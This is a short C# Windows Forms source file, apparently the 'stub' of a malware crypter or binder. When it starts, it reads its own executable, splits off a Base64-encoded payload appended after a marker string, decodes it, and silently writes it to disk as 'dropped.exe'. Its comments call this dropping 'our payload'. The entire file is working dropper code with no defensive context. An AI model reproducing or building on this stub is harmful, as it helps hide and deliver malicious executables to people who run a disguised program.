using System;
using System.IO;
using System.Windows.Forms;

namespace encoderStub
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string curText = File.ReadAllText(Application.ExecutablePath); // Since we're after a Base64 encoded string, this should do fine.
            string split = "#defaultSplit#"; // our file split.

            // Decode & Drop our payload.
            File.WriteAllBytes(Environment.CurrentDirectory + @"\dropped.exe", Convert.FromBase64String(curText.Split(new[] { split },  StringSplitOptions.RemoveEmptyEntries)[1]));

            Environment.Exit(0);
        }
    }
}
